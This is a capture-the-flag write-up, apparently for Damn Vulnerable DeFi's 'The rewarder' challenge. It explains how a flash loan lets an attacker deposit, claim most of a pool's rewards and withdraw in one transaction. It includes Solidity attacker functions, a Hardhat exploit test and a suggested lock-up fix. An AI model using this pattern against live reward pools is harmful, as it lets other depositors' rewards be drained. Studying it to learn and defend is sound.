# The rewarder

## Challenge

There's a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.

Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!

You don't have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.

Oh, by the way, rumours say a new pool has just landed on mainnet. Isn't it offering DVT tokens in flash loans?

## Solution

Our goal is to claim the most rewards tokens we can. We observe that the rewards are calculated using the follwing formula

```solidity
rewards = (amountDeposited * 100 * 10 ** 18) / totalDeposits;
```

This means that the rewards to claim are proportional to the ratio of the total amount deposited divided by the total deposits. Therefore, depositing a huge amount would mean that this ratio is close to 1, making it possible to claim almost the totality of the rewards. But how can we deposit a huge amount of DVT tokens? That is where the flashloan pool can help us.

We observe that `TheRewarderPool` allows us to claim rewards every 5 days. However the deposit does not need to be locked for 5 days. Then we can deposit DVT tokens, mint some Accounting Tokens, use these tokens to claim the reward, and widthdraw our DVT tokens all in one transaction. This is the ideal scenario to perform a flashloan. We create an attacker contract named [`AttackerTheRewarder.sol`](./AttackerTheRewarder.sol), and we describe its main functions below.

First we create an `attack` function that launches the flashloan

```solidity
function attack(uint256 _amount) public {
    flashLoanerPool.flashLoan(_amount);
    rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
}
```

The `flashLoan` function makes a call to the function `receiveFlashLoan` of `msg.sender`, so we implement it.

```solidity
function receiveFlashLoan(uint256 _amount) public {
    DVT.approve(address(rewarderPool), _amount);
    rewarderPool.deposit(_amount);
    rewarderPool.withdraw(_amount);
    DVT.transfer(address(flashLoanerPool), _amount);
}
```

Before depositing the DVT tokens we have received from the flashloan, we approve the `_amount` to transfer to the `TheRewarderPool` contract. Once the deposit is made, if it is time for distributing the rewards, `TheRewarderPool` will transfer to us the corresponding rewards. So, we can withdrwaw the DVT tokens and pay back the loan. This finishes the flashloan transaction, and we send all the reward tokens to the initiator of the attack.

In order to run the attack, we first need to advance the time machine 5 days, so we can claim the rewards. Then we just run the attack, asking for a huge flashloan. The code to do that is then quite straigthforward,

```javascript
it("Exploit", async function () {
  /** CODE YOUR EXPLOIT HERE */
  await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]) // 5 days

  const Attacker = await ethers.getContractFactory(
    "AttackerTheRewarder",
    attacker
  )
  attackerContract = await Attacker.deploy(
    this.liquidityToken.address,
    this.rewardToken.address,
    this.rewarderPool.address,
    this.flashLoanPool.address
  )
  await attackerContract.attack(TOKENS_IN_LENDER_POOL)
})
```

The complete code can be found in [`the-rewarder.challenge.js`](../../test/the-rewarder/the-rewarder.challenge.js)

## Solving the issue

There is many ways to solve the issue of `TheRewarderPool.sol`. As we have seen the fact of being able to deposit, claim rewards and withdraw in one transaction constitutes a vulnerability to a flashloan attack. Implementing a mechanism that delays claiming rewards by locking your funds for the complete 5 days is a reasonable solution.
